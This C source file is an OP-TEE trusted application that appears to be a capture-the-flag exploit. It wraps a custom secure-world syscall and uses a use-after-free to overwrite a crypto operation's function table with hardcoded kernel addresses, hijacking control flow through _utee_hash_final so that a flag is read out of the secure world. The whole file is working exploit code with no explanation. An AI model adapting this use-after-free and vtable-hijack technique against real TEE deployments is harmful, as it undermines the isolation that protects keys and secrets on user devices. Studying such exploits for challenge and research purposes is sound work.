#include <stdint.h>
#include <stddef.h>

#include <utee_types.h>
#include <utee_syscalls.h>
#include <tee_internal_api.h>
#include <tee_internal_api_extensions.h>

#include <xploit_ta.h>

static uint64_t syscall_sas(uint64_t op, uint64_t idx, void*buf, size_t len) 
{
  uint64_t ret = 0;
   
  asm volatile (
    "mov x0, %[op]\n"
    "mov x1, %[idx]\n"
    "mov x2, %[buf]\n"
    "mov x3, %[len]\n"
    "mov x8, #69\n"
    "svc #0\n"
    "mov %[ret], x0\n"
    : [ret] "=r" (ret)
    : [op] "r" (op), [idx] "r" (idx), [buf] "r" (buf), [len] "r" (len)
    : "x0", "x1", "x2", "x3", "x8"
  );

  return ret;
}

static uint64_t sas_alloc(uint64_t idx, size_t len)
{
  return syscall_sas(1, idx, NULL, len); 
}

static uint64_t sas_free(uint64_t idx)
{
  return syscall_sas(2, idx, NULL, 0); 
}

static uint64_t sas_write(uint64_t idx, const uint8_t* buf, size_t len)
{
  return syscall_sas(3, idx, buf, len); 
}

static uint64_t sas_read(uint64_t idx, uint8_t* buf, size_t len)
{
  return syscall_sas(4, idx, buf, len); 
}

char flag[0x100];

static void exploit(void)
{
  const uint64_t fake_ops[] =
  {
    0xE1DE140, 0xE1DE11C, 0x0E1AD418, 0xE1DE0F4, 0xE1DE168
  };

  const uint64_t fake_ops_address = 0xe145480;

  sas_alloc(0, 0x1000);
  sas_write(0, fake_ops, sizeof(fake_ops));

  sas_alloc(1, 0x1B0uLL);
  sas_free(1);

  TEE_Result res;
  TEE_OperationHandle operation;
  res = TEE_AllocateOperation(&operation, TEE_ALG_MD5, TEE_MODE_DIGEST, 0);
  if (res != TEE_SUCCESS)
  {
    EMSG("AllocateOperation failed res=0x%08x", res);
    return;
  }

  sas_write(1, &fake_ops_address, sizeof(fake_ops_address));

  char msg[]      = "kek";
  size_t hash_len = sizeof(flag);
  _utee_hash_final(*(uint32_t*)((char*)operation+0x58), msg, sizeof(msg)-1, flag, &hash_len);

  DMSG("flag @ %s\n", flag);
}

TEE_Result TA_CreateEntryPoint(void)
{
  return TEE_SUCCESS;
}

void TA_DestroyEntryPoint(void)
{
}

TEE_Result TA_OpenSessionEntryPoint(uint32_t param_types,
  TEE_Param __maybe_unused params[4],
  void __maybe_unused **sess_ctx)
{
  return TEE_SUCCESS;
}

void TA_CloseSessionEntryPoint(void __maybe_unused *sess_ctx)
{
}

TEE_Result TA_InvokeCommandEntryPoint(void __maybe_unused *sess_ctx,
  uint32_t cmd_id,
  uint32_t param_types, TEE_Param params[4])
{
  DMSG("xploit\n");
  exploit();
  TEE_MemMove(params[0].memref.buffer, flag, params[0].memref.size);
  return TEE_SUCCESS;
}
